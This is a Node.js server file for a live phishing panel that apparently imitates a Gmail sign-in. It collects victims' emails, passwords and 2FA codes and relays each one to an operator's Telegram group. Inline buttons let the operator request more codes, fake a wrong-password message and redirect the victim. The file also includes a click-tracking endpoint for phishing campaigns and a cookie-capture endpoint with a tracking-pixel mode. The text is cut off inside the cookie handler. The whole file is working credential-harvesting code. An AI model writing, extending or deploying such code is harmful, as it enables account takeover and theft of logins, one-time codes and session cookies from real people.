require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const requestIp = require('request-ip');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();
const server = http.createServer(app);

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

app.use(cors({
  origin: ['http://localhost:3001', 'http://127.0.0.1:3001'],
  credentials: true
}));
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const io = new Server(server, {
  cors: {
    origin: ['http://localhost:3001', 'http://127.0.0.1:3001'],
    methods: ['GET', 'POST'],
    credentials: true
  },
  connectionStateRecovery: {
    maxDisconnectionDuration: 30000,
    skipMiddlewares: true
  },
  transports: ['polling', 'websocket'],
  allowUpgrades: true,
  pingTimeout: 60000,
  pingInterval: 25000,
  connectTimeout: 45000,
  maxHttpBufferSize: 1e6,
  perMessageDeflate: false,
  httpCompression: false
});

// ============= BOT INITIALIZATION =============
let bot;
let telegramGroupId = process.env.TELEGRAM_GROUP_ID;

const initializeBot = () => {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
  
  const usePolling = process.env.USE_POLLING === 'true' || 
                     process.env.NODE_ENV !== 'production' ||
                     !process.env.FRONTEND_URL ||
                     process.env.FRONTEND_URL.includes('localhost');
  
  if (usePolling) {
    console.log('🔧 Using POLLING mode (local development)');
    
    bot.deleteWebHook()
      .then(() => {
        console.log('✅ Webhook cleared');
        return bot.startPolling();
      })
      .then(() => {
        console.log('✅ Bot polling started successfully');
      })
      .catch(err => {
        console.error('❌ Failed to start polling:', err);
      });
  } else {
    console.log('🚀 Using WEBHOOK mode (production)');
    
    const webhookUrl = `${process.env.FRONTEND_URL}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
    
    bot.setWebHook(webhookUrl)
      .then(() => {
        console.log('✅ Webhook set successfully');
      })
      .catch(err => {
        console.error('❌ Webhook setup failed:', err);
      });
  }
  
  return bot;
};

initializeBot();

// Create webhook endpoint
app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ============= SESSION MANAGEMENT =============
const activeSessions = new Map();
const capturedSessions = new Map(); // For proxy-captured data
const SESSION_TIMEOUT = 7200000; // 2 hours
const CODE_EXPIRATION_TIME = 600000; // 10 minutes
const CLEANUP_INTERVAL = 600000; // 10 minutes
const EMPTY_SESSION_GRACE_PERIOD = 7200000; // 2 hours

// Debug middleware
app.use((req, res, next) => {
  console.log(`📨 HTTP ${req.method} ${req.path}`);
  next();
});

// ============= HELPER FUNCTIONS =============
function cleanupStaleSockets(session) {
  if (!session) return false;
  
  const deadSockets = [];
  for (let socketId of session.sockets) {
    const socket = io.sockets.sockets.get(socketId);
    if (!socket || !socket.connected) {
      deadSockets.push(socketId);
    }
  }
  
  deadSockets.forEach(id => {
    session.sockets.delete(id);
    console.log(`🧹 Removed stale socket ${id} from session`);
  });
  
  return deadSockets.length > 0;
}

function sendToSession(sessionId, event, data) {
  console.log(`\n📤 SENDING ${event} TO SESSION: ${sessionId}`);
  
  const session = activeSessions.get(sessionId);
  if (!session) {
    console.log(`❌ Session ${sessionId} not found for ${event}`);
    return { success: false, reason: 'session_not_found' };
  }
  
  cleanupStaleSockets(session);
  
  if (session.sockets.size === 0) {
    console.log(`❌ No active sockets in session ${sessionId} for ${event}`);
    return { success: false, reason: 'no_sockets' };
  }
  
  let sentCount = 0;
  for (let socketId of session.sockets) {
    const socket = io.sockets.sockets.get(socketId);
    if (socket && socket.connected) {
      socket.emit(event, data);
      sentCount++;
    }
  }
  
  console.log(`✅ Sent ${event} to ${sentCount}/${session.sockets.size} socket(s)\n`);
  
  if (sentCount === 0) {
    return { success: false, reason: 'no_connected_sockets' };
  }
  
  return { success: true, sentCount };
}

async function validateSessionForCallback(cb, sessionId, session, action) {
  if (!session) {
    await bot.answerCallbackQuery(cb.id, { 
      text: '❌ Session expired. Please refresh the page.', 
      show_alert: true 
    });
    return false;
  }
  
  cleanupStaleSockets(session);
  
  if (session.sockets.size === 0) {
    console.log(`❌ No active sockets for session ${sessionId}`);
    await bot.answerCallbackQuery(cb.id, { 
      text: '❌ User disconnected. Please ask them to refresh the page.', 
      show_alert: true 
    });
    return false;
  }
  
  return true;
}

// Session cleanup interval
setInterval(() => {
  const now = Date.now();
  let cleanedCount = 0;
  
  for (const [sessionId, session] of activeSessions.entries()) {
    cleanupStaleSockets(session);
    
    if (session.codeRequestTime && now - session.codeRequestTime > CODE_EXPIRATION_TIME) {
      sendToSession(sessionId, 'code_expired', {
        message: 'The verification code has expired. Please request a new code.',
        attempts: session.codeAttempts || 0
      });
      session.codeRequestTime = null;
    }
    
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      activeSessions.delete(sessionId);
      cleanedCount++;
    } else if (session.sockets.size === 0 && (now - session.lastActivity) > EMPTY_SESSION_GRACE_PERIOD) {
      activeSessions.delete(sessionId);
      cleanedCount++;
    }
  }
  
  if (cleanedCount > 0) {
    console.log(`🧹 Cleaned up ${cleanedCount} sessions. Total active: ${activeSessions.size}`);
  }
}, CLEANUP_INTERVAL);

const getClientDetails = (socket, userAgent) => {
  try {
    const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    const geo = geoip.lookup(ip) || {};
    const agent = useragent.parse(userAgent);

    return {
      ip: ip || 'Unknown',
      location: geo.country ?
        `${geo.city || 'Unknown city'}, ${geo.region || 'Unknown region'}, ${geo.country}` :
        'Unknown location',
      browser: agent.toAgent() || 'Unknown',
      os: agent.os.toString() || 'Unknown',
      device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
      timestamp: new Date().toLocaleString()
    };
  } catch (err) {
    console.error('Error getting client details:', err);
    return {
      ip: 'Unknown',
      location: 'Unknown',
      browser: 'Unknown',
      os: 'Unknown',
      device: 'Unknown',
      timestamp: new Date().toLocaleString()
    };
  }
};

// ============= SOCKET.IO CONNECTION HANDLER =============
io.on('connection', (socket) => {
  console.log('✅ New connection:', socket.id);
  console.log('📋 Query params:', socket.handshake.query);

  let sessionId = socket.handshake.query.sessionId || uuidv4();
  
  if (!sessionId || sessionId === 'undefined' || sessionId === 'null') {
    console.log('⚠️ Invalid sessionId, generating new one');
    sessionId = uuidv4();
  }
  
  socket.sessionId = sessionId;
  console.log('🆔 Using session ID:', sessionId);

  if (activeSessions.has(sessionId)) {
    const existingSession = activeSessions.get(sessionId);
    console.log(`📊 Existing session ${sessionId} has ${existingSession.sockets.size} socket(s)`);
    cleanupStaleSockets(existingSession);
  }

  if (!activeSessions.has(sessionId)) {
    activeSessions.set(sessionId, {
      stage: 'initial',
      lastActivity: Date.now(),
      lastUsed: Date.now(),
      details: null,
      email: null,
      password: null,
      codeType: null,
      code: null,
      codeRequestTime: null,
      codeAttempts: 0,
      sockets: new Set(),
      passwordAttempts: 0,
      createdAt: Date.now(),
      waitingFor: null
    });
    console.log(`🆕 Created new session: ${sessionId}`);
  }

  const session = activeSessions.get(sessionId);
  session.sockets.add(socket.id);
  session.lastActivity = Date.now();
  session.lastUsed = Date.now();

  console.log(`👥 Session ${sessionId} now has ${session.sockets.size} socket(s)`);

  socket.emit('connection_established', { 
    sessionId, 
    socketId: socket.id,
    activeSockets: session.sockets.size 
  });

  socket.onAny((event, ...args) => {
    console.log(`📨 Socket event received: ${event}`, args);
    session.lastActivity = Date.now();
    session.lastUsed = Date.now();
  });

  socket.on('ping', () => {
    session.lastActivity = Date.now();
  });

  socket.on('pong', () => {
    session.lastActivity = Date.now();
  });

  socket.on('client_info', (userAgent) => {
    console.log('👤 Client info received:', userAgent);
    session.details = getClientDetails(socket, userAgent);
    session.lastActivity = Date.now();
    socket.emit('info_received');
  });

  socket.on('submit_email', async (email) => {
    try {
      console.log('📧 Email submitted:', email, 'for session:', sessionId);
      
      if (!email || typeof email !== 'string') {
        throw new Error('Invalid email format');
      }

      session.email = email.trim();
      session.stage = 'awaiting_password';
      session.lastActivity = Date.now();

      const { ip, location, device } = session.details || {};
      const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${session.email}\nIP: ${ip}\nLocation: ${location}\nDevice: ${device}\n\nApprove this request?`;

      await bot.sendMessage(telegramGroupId, message, {
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }],
            [{ text: '❌ Reject', callback_data: `reject|${sessionId}` }]
          ]
        }
      });

      console.log('✅ Telegram message sent for email:', session.email);
      socket.emit('email_sent');
    } catch (err) {
      console.error('❌ Email submission error:', err);
      socket.emit('error', { message: err.message });
    }
  });

  socket.on('submit_password', async (password) => {
    try {
      console.log('🔑 Password submitted for session:', sessionId);
      
      if (session.stage !== 'awaiting_password') {
        throw new Error('Invalid state: Not awaiting password');
      }

      session.password = password;
      session.stage = 'awaiting_action';
      session.lastActivity = Date.now();
      session.passwordAttempts += 1;

      await bot.sendMessage(telegramGroupId, 
        `🔒 Password received for Email: ${session.email}\n\n` +
        `Password: ${session.password}\n\n` +
        `Choose an action:`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
              [{ text: '🔐 Request Authenticator Code', callback_data: `request_auth|${sessionId}` }],
              [{ text: '✏️ Send Custom Code', callback_data: `custom_code|${sessionId}` }],
              [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
              [{ text: '✅ Redirect to Gmail', callback_data: `done|${sessionId}` }],
              [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }],
              [{ text: '🔄 Request Password Again', callback_data: `request_password_again|${sessionId}` }],
              [{ text: '❌ Reject Login', callback_data: `reject|${sessionId}` }]
            ]
          }
        }
      );

      console.log('✅ Password processed for email:', session.email);
      socket.emit('password_sent');
    } catch (err) {
      console.error('❌ Password submission error:', err);
      socket.emit('error', { message: err.message });
    }
  });

  socket.on('request_new_code', async ({ codeType }) => {
    try {
      console.log('🔄 New code requested:', codeType, 'for session:', sessionId);
      
      session.codeType = codeType;
      session.codeRequestTime = Date.now();
      session.lastActivity = Date.now();
      session.stage = 'awaiting_2fa';

      await bot.sendMessage(telegramGroupId, 
        `🔄 New ${codeType} code requested for ${session.email}\n\n` +
        `Choose an action:`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: `🔢 Send 123456`, callback_data: `send_code_123456|${sessionId}` }],
              [{ text: `🔢 Send 654321`, callback_data: `send_code_654321|${sessionId}` }],
              [{ text: `🔢 Send 000000`, callback_data: `send_code_000000|${sessionId}` }],
              [{ text: `✏️ Send Custom ${codeType.toUpperCase()} Code`, callback_data: `custom_code|${sessionId}` }],
              [{ text: `📨 Send Custom Message`, callback_data: `custom_message|${sessionId}` }],
              [{ text: `✅ Done - Redirect to Gmail`, callback_data: `done|${sessionId}` }],
              [{ text: `🌐 Redirect to Custom Site`, callback_data: `custom_redirect|${sessionId}` }]
            ]
          }
        }
      );

      socket.emit('request_2fa', codeType);
    } catch (err) {
      console.error('❌ New code request error:', err);
      socket.emit('error', { message: err.message });
    }
  });

  socket.on('submit_2fa_code', async ({ code, codeType }) => {
    try {
      console.log('🔢 2FA code submitted:', code, 'type:', codeType, 'for session:', sessionId);
      
      if (session.stage !== 'awaiting_2fa' && session.stage !== 'awaiting_action') {
        throw new Error('Invalid state: Not awaiting 2FA');
      }

      if (session.codeRequestTime && Date.now() - session.codeRequestTime > CODE_EXPIRATION_TIME) {
        socket.emit('code_expired', {
          message: 'The verification code has expired. Please request a new code.',
          attempts: session.codeAttempts
        });
        return;
      }

      session.code = code;
      session.codeType = codeType;
      session.codeAttempts = (session.codeAttempts || 0) + 1;
      session.lastActivity = Date.now();

      await bot.sendMessage(telegramGroupId, 
        `✅ 2FA code received for ${session.email}\n\n` +
        `2FA Code: ${session.code}\n\n` +
        `Final approval:`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: '👍 Approve Login', callback_data: `approve|${sessionId}` }],
              [{ text: '👎 Reject', callback_data: `reject|${sessionId}` }],
              [{ text: '🔄 Request New Code', callback_data: `request_new_${codeType}|${sessionId}` }],
              [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
              [{ text: '✅ Done - Redirect to Gmail', callback_data: `done|${sessionId}` }],
              [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }]
            ]
          }
        }
      );

      socket.emit('code_sent');
    } catch (err) {
      console.error('❌ 2FA error:', err);
      socket.emit('error', { message: err.message });
    }
  });

  socket.on('disconnect', (reason) => {
    console.log(`❌ Disconnected ${socket.id} from session ${sessionId}, reason: ${reason}`);
    
    session.sockets.delete(socket.id);
    session.lastActivity = Date.now();
    
    console.log(`👥 Session ${sessionId} now has ${session.sockets.size} socket(s) after disconnect`);
    
    if (session.sockets.size === 0) {
      console.log(`⏰ Session ${sessionId} has no sockets, will be kept for ${EMPTY_SESSION_GRACE_PERIOD/60000} minutes`);
    }
  });

  socket.on('connect_error', (error) => {
    console.error(`❌ Connection error for ${socket.id}:`, error);
  });

  socket.on('error', (error) => {
    console.error(`❌ Socket error for ${socket.id}:`, error);
  });

  if (socket.conn) {
    socket.conn.on('error', (error) => {
      console.error(`❌ Transport error for ${socket.id}:`, error);
    });

    socket.conn.on('close', (reason) => {
      console.log(`🔌 Transport closed for ${socket.id}, reason:`, reason);
    });
  }
});

// ============= TELEGRAM BOT HANDLERS =============
bot.on('callback_query', async (cb) => {
  try {
    console.log('📱 Telegram callback received:', cb.data);
    const [action, sessionId] = cb.data.split('|');
    const session = activeSessions.get(sessionId);

    const isValid = await validateSessionForCallback(cb, sessionId, session, action);
    if (!isValid) return;

    session.lastActivity = Date.now();
    console.log('🔍 Processing callback for session:', sessionId, 'action:', action);

    if (action.startsWith('send_code_')) {
      const code = action.split('_')[2];
      console.log(`📨 Admin sending code ${code} to session:`, sessionId);
      
      const result = sendToSession(sessionId, 'admin_sent_code', {
        code: code,
        message: `Admin sent verification code: ${code}`
      });
      
      if (result.success) {
        await bot.sendMessage(telegramGroupId, `✅ Code ${code} sent to user for ${session.email}`);
        await bot.answerCallbackQuery(cb.id, { text: `Code ${code} sent to user`, show_alert: true });
      } else {
        await bot.answerCallbackQuery(cb.id, { 
          text: '❌ User disconnected. Please ask them to refresh.', 
          show_alert: true 
        });
      }
      return;
    }

    switch (action) {
      case 'request_password':
        console.log('🔑 Requesting password for session:', sessionId);
        session.stage = 'awaiting_password';
        
        const pwdResult = sendToSession(sessionId, 'request_password');
        if (pwdResult.success) {
          await bot.answerCallbackQuery(cb.id, { 
            text: `Requesting password for: ${session.email}`, 
            show_alert: true 
          });
        } else {
          await bot.answerCallbackQuery(cb.id, { 
            text: '❌ User disconnected. Please ask them to refresh.', 
            show_alert: true 
          });
        }
        break;

      case 'request_password_again':
        console.log('🔄 Requesting password again for session:', sessionId);
        session.stage = 'awaiting_password';
        session.passwordAttempts += 1;
        
        const pwdAgainResult = sendToSession(sessionId, 'wrong_password', { 
          message: 'The password was incorrect. Please enter your password again.',
          attempts: session.passwordAttempts
        });
        
        if (pwdAgainResult.success) {
          await bot.answerCallbackQuery(cb.id, { 
            text: `Requesting password again for: ${session.email}`, 
            show_alert: true 
          });
        } else {
          await bot.answerCallbackQuery(cb.id, { 
            text: '❌ User disconnected. Please ask them to refresh.', 
            show_alert: true 
          });
        }
        break;

      case 'request_sms':
      case 'request_auth':
        const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
        console.log(`📱 Requesting ${codeType} code for session:`, sessionId);
        
        session.codeType = codeType;
        session.codeRequestTime = Date.now();
        session.codeAttempts = 0;
        session.stage = 'awaiting_2fa';
        
        const codeResult = sendToSession(sessionId, 'request_2fa', codeType);
        
        if (codeResult.success) {
          await bot.sendMessage(telegramGroupId, 
            `📱 ${codeType.toUpperCase()} code requested for ${session.email}\n\n` +
            `Send a verification code to the user:`,
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔢 Send 123456', callback_data: `send_code_123456|${sessionId}` }],
                  [{ text: '🔢 Send 654321', callback_data: `send_code_654321|${sessionId}` }],
                  [{ text: '🔢 Send 000000', callback_data: `send_code_000000|${sessionId}` }],
                  [{ text: '✏️ Send Custom Code', callback_data: `custom_code|${sessionId}` }],
                  [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
                  [{ text: '✅ Done - Redirect to Gmail', callback_data: `done|${sessionId}` }],
                  [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }]
                ]
              }
            }
          );
          
          await bot.answerCallbackQuery(cb.id, {
            text: `Requesting ${codeType} code for: ${session.email}`,
            show_alert: true
          });
        } else {
          await bot.answerCallbackQuery(cb.id, { 
            text: '❌ User disconnected. Please ask them to refresh.', 
            show_alert: true 
          });
        }
        break;

      case 'request_new_sms':
      case 'request_new_auth':
        const newCodeType = action === 'request_new_sms' ? 'sms' : 'authenticator';
        console.log(`🔄 Requesting new ${newCodeType} code for session:`, sessionId);
        
        session.codeType = newCodeType;
        session.codeRequestTime = Date.now();
        session.codeAttempts = 0;
        session.stage = 'awaiting_2fa';
        
        const newCodeResult = sendToSession(sessionId, 'request_2fa', newCodeType);
        
        if (newCodeResult.success) {
          await bot.sendMessage(telegramGroupId, 
            `📱 New ${newCodeType.toUpperCase()} code requested for ${session.email}\n\n` +
            `Send a verification code to the user:`,
            {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔢 Send 123456', callback_data: `send_code_123456|${sessionId}` }],
                  [{ text: '🔢 Send 654321', callback_data: `send_code_654321|${sessionId}` }],
                  [{ text: '🔢 Send 000000', callback_data: `send_code_000000|${sessionId}` }],
                  [{ text: '✏️ Send Custom Code', callback_data: `custom_code|${sessionId}` }],
                  [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
                  [{ text: '✅ Done - Redirect to Gmail', callback_data: `done|${sessionId}` }],
                  [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }]
                ]
              }
            }
          );
          
          await bot.answerCallbackQuery(cb.id, {
            text: `Requesting new ${newCodeType} code for: ${session.email}`,
            show_alert: true
          });
        } else {
          await bot.answerCallbackQuery(cb.id, { 
            text: '❌ User disconnected. Please ask them to refresh.', 
            show_alert: true 
          });
        }
        break;

      case 'approve':
        console.log('✅ Approving login for session:', sessionId);
        
        const approveResult = sendToSession(sessionId, 'login_approved');
        if (approveResult.success) {
          await bot.sendMessage(telegramGroupId, `✅ Login approved for: ${session.email}`);
          await bot.answerCallbackQuery(cb.id, { 
            text: `Login approved for: ${session.email}`, 
            show_alert: true 
          });
        } else {
          await bot.answerCallbackQuery(cb.id, { 
            text: '❌ User disconnected. Please ask them to refresh.', 
            show_alert: true 
          });
        }
        break;

      case 'reject':
        console.log('❌ Rejecting login for session:', sessionId);
        
        const rejectResult = sendToSession(sessionId, 'login_rejected');
        if (rejectResult.success) {
          await bot.sendMessage(telegramGroupId, `❌ Login rejected for: ${session.email}`);
          await bot.answerCallbackQuery(cb.id, { 
            text: `Login rejected for: ${session.email}`, 
            show_alert: true 
          });
        } else {
          await bot.answerCallbackQuery(cb.id, { 
            text: '❌ User disconnected. Please ask them to refresh.', 
            show_alert: true 
          });
        }
        break;

      case 'done':
        console.log('🔗 Redirecting to Gmail for session:', sessionId);
        
        const doneResult = sendToSession(sessionId, 'redirect_to_gmail');
        if (doneResult.success) {
          await bot.sendMessage(telegramGroupId, 
            `🔗 Redirecting to Gmail for: ${session.email}\n\n` +
            `✅ Credentials captured:\n` +
            `Email: ${session.email}\n` +
            `Password: ${session.password || 'N/A'}\n` +
            `${session.code ? `2FA Code: ${session.code}\n` : ''}`
          );
          await bot.answerCallbackQuery(cb.id, { 
            text: `Redirecting user to Gmail: ${session.email}`, 
            show_alert: true 
          });
        } else {
          await bot.answerCallbackQuery(cb.id, { 
            text: '❌ User disconnected. Please ask them to refresh.', 
            show_alert: true 
          });
        }
        break;

      case 'custom_code':
        await bot.sendMessage(telegramGroupId, 
          `✏️ Please send the custom verification code for ${session.email} as a message.\n` +
          `The code should be numbers only (2-4 digits).`
        );
        session.waitingFor = 'custom_code';
        await bot.answerCallbackQuery(cb.id, { 
          text: 'Please type the code and send it as a message', 
          show_alert: true 
        });
        break;

      case 'custom_message':
        await bot.sendMessage(telegramGroupId, 
          `✏️ Please send the custom message for ${session.email} as a message.`
        );
        session.waitingFor = 'custom_message';
        await bot.answerCallbackQuery(cb.id, { 
          text: 'Please type the message and send it', 
          show_alert: true 
        });
        break;

      case 'custom_redirect':
        await bot.sendMessage(telegramGroupId, 
          `🌐 Please send the custom redirect URL for ${session.email} as a message.\n` +
          `The URL should start with http:// or https://`
        );
        session.waitingFor = 'custom_redirect';
        await bot.answerCallbackQuery(cb.id, { 
          text: 'Please type the URL and send it', 
          show_alert: true 
        });
        break;
    }
  } catch (err) {
    console.error('❌ Callback error:', err);
    bot.answerCallbackQuery(cb.id, { text: 'Error processing request', show_alert: true });
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id.toString();
  
  if (chatId !== telegramGroupId) {
    return;
  }

  const text = msg.text;
  console.log('📨 Raw message received:', text);
  
  const activeSessionEntries = Array.from(activeSessions.entries());
  if (activeSessionEntries.length === 0) {
    console.log('❌ No active sessions');
    return;
  }
  
  activeSessionEntries.forEach(([_, session]) => cleanupStaleSockets(session));
  
  const waitingSessions = activeSessionEntries
    .filter(([_, s]) => s.waitingFor && s.sockets.size > 0)
    .sort((a, b) => b[1].lastActivity - a[1].lastActivity);
  
  if (waitingSessions.length === 0) {
    console.log('❌ No sessions waiting for input');
    return;
  }
  
  const [sessionId, session] = waitingSessions[0];
  const waitingFor = session.waitingFor;
  
  console.log(`📨 Processing ${waitingFor} for session ${sessionId}: ${text}`);
  
  session.waitingFor = null;
  
  switch (waitingFor) {
    case 'custom_code':
      if (/^\d{2,4}$/.test(text)) {
        console.log(`✅ Valid custom code: ${text}`);
        
        const result = sendToSession(sessionId, 'admin_sent_code', {
          code: text,
          message: `Admin sent verification code: ${text}`
        });
        
        if (result.success) {
          await bot.sendMessage(telegramGroupId, `✅ Custom code ${text} sent to user for ${session.email}`);
        } else {
          await bot.sendMessage(telegramGroupId, 
            `❌ Failed to send code. User may be disconnected. Please ask them to refresh the page.`
          );
        }
      } else {
        console.log(`❌ Invalid code format: ${text}`);
        await bot.sendMessage(telegramGroupId, 
          `❌ Invalid code format. Please use 2-4 digits only.\n` +
          `Please try again by clicking "Custom Code" button.`
        );
      }
      break;
      
    case 'custom_message':
      console.log(`✅ Sending custom message: ${text}`);
      
      const messageResult = sendToSession(sessionId, 'admin_message', {
        message: text,
        isError: false
      });
      
      if (messageResult.success) {
        await bot.sendMessage(telegramGroupId, `✅ Custom message sent to user for ${session.email}`);
      } else {
        await bot.sendMessage(telegramGroupId, 
          `❌ Failed to send message. User may be disconnected. Please ask them to refresh the page.`
        );
      }
      break;
      
    case 'custom_redirect':
      if (text.startsWith('http://') || text.startsWith('https://')) {
        console.log(`✅ Sending redirect to: ${text}`);
        
        const redirectResult = sendToSession(sessionId, 'redirect_to_site', {
          url: text,
          message: `Redirecting to ${text}...`
        });
        
        if (redirectResult.success) {
          await bot.sendMessage(telegramGroupId, `🔗 Redirecting user to ${text}`);
        } else {
          await bot.sendMessage(telegramGroupId, 
            `❌ Failed to redirect. User may be disconnected. Please ask them to refresh the page.`
          );
        }
      } else {
        console.log(`❌ Invalid URL format: ${text}`);
        await bot.sendMessage(telegramGroupId, 
          `❌ Invalid URL format. URL must start with http:// or https://\n` +
          `Please try again by clicking "Redirect to Custom Site" button.`
        );
      }
      break;
  }
});

// ============= LINK TRACKING =============
app.get('/track/click', async (req, res) => {
  try {
    const {
      email = 'unknown',
      campaign = 'unknown',
      link = '#',
      template = 'unknown',
      name = 'unknown'
    } = req.query;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
      }
    } catch (e) {}

    const clickTime = new Date().toLocaleString();
    const token = crypto.randomBytes(4).toString('hex');

    console.log(`\n🔗 LINK CLICKED [${token}]`);
    console.log(`   Email: ${email}`);
    console.log(`   Campaign: ${campaign}`);
    console.log(`   Link: ${link}`);
    console.log(`   IP: ${ip}`);
    console.log(`   Time: ${clickTime}`);

    if (bot && telegramGroupId) {
      const message = 
        `🔗 *Link Clicked!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${email}\`\n` +
        `*Name:* ${name}\n` +
        `*Campaign:* ${campaign}\n` +
        `*Template:* ${template}\n` +
        `*Link:* ${link}\n` +
        `*IP:* \`${ip}\`\n` +
        `*Location:* ${location}\n` +
        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
        `*Time:* ${clickTime}\n` +
        `*Token:* \`${token}\``;

      await bot.sendMessage(telegramGroupId, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
      
      console.log(`✅ Telegram notification sent for click ${token}`);
    }

    if (link && link !== '#') {
      return res.redirect(302, link);
    } else {
      return res.send(`
        <html>
          <head>
            <title>Link Tracked</title>
            <style>
              body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
              .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
              h2 { color: #333; }
              p { color: #666; }
            </style>
          </head>
          <body>
            <div class="container">
              <h2>✅ Click Tracked</h2>
              <p>Your click has been recorded.</p>
              <p><small>Campaign: ${campaign}</small></p>
            </div>
          </body>
        </html>
      `);
    }

  } catch (error) {
    console.error('❌ Error tracking click:', error);
    
    if (req.query.link && req.query.link !== '#') {
      return res.redirect(302, req.query.link);
    }
    
    res.status(500).send('Error tracking click');
  }
});

// ============= COOKIE CAPTURE ENDPOINT =============
app.get('/capture', async (req, res) => {
  try {
    const {
      source = 'direct',
      campaign = 'unknown',
      email = 'unknown',
      name = 'unknown',
      redirect = 'https://google.com'
    } = req.query;

    const ip = requestIp.getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown'}, ${geo.region || 'Unknown'}, ${geo.country || 'Unknown'}`;
      }
    } catch (e) {}

    const cookies = req.cookies || {};
    const captureTime = new Date().toLocaleString();
    const token = crypto.randomBytes(4).toString('hex').toUpperCase();

    console.log(`\n🍪 COOKIES CAPTURED [${token}]`);
    console.log(`   Source: ${source}`);
    console.log(`   Campaign: ${campaign}`);
    console.log(`   Email: ${email}`);
    console.log(`   IP: ${ip}`);
    console.log(`   Time: ${captureTime}`);
    console.log(`   Cookies:`, cookies);

    let cookiesText = '';
    if (Object.keys(cookies).length > 0) {
      cookiesText = Object.entries(cookies)
        .map(([key, value]) => `• *${key}*: \`${value}\``)
        .join('\n');
    } else {
      cookiesText = 'No cookies found';
    }

    if (bot && telegramGroupId) {
      const message = 
        `🍪 *Cookies Captured!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Token:* \`${token}\`\n` +
        `*Source:* ${source}\n` +
        `*Campaign:* ${campaign}\n` +
        `*Email:* \`${email}\`\n` +
        `*Name:* ${name}\n` +
        `*IP:* \`${ip}\`\n` +
        `*Location:* ${location}\n` +
        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
        `*Device:* ${agent.device.toString() || 'Desktop'}\n` +
        `*Time:* ${captureTime}\n\n` +
        `*Cookies (${Object.keys(cookies).length}):*\n${cookiesText}\n\n`;

      if (message.length > 4000) {
        await bot.sendMessage(telegramGroupId, 
          `🍪 *Cookies Captured!*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `*Token:* \`${token}\`\n` +
          `*Source:* ${source}\n` +
          `*Email:* \`${email}\`\n` +
          `*IP:* \`${ip}\`\n` +
          `*Location:* ${location}\n` +
          `*Time:* ${captureTime}\n` +
          `*Total Cookies:* ${Object.keys(cookies).length}\n\n` +
          `_Full cookie data too large - check server logs_`,
          { parse_mode: 'Markdown' }
        );
        
        console.log(`🍪 Full cookies for ${token}:`, JSON.stringify(cookies, null, 2));
      } else {
        await bot.sendMessage(telegramGroupId, message, {
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        });
      }
      
      console.log(`✅ Telegram notification sent for cookie capture ${token}`);
    }

    if (req.query.format === 'pixel') {
      res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Content-Length': '43',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    } else if (req.query.format === 'json') {
      res.json({
        success: true,
        token: token,
        message: 'Cookies captured successfully',
        cookie_count: Object.keys(cookies).length,
        redirect: redirect
      });
    } else {
      const redirectUrl = new URL(redirect, 'https://google.com');
      redirectUrl.searchParams.append('captured', token);
      redirectUrl.searchParams.append('source', source);
      
      res.redirect(302, redirectUrl.toString());
    }

  } catch (error) {
    console.error('❌ Error capturing cookies:', error);
    
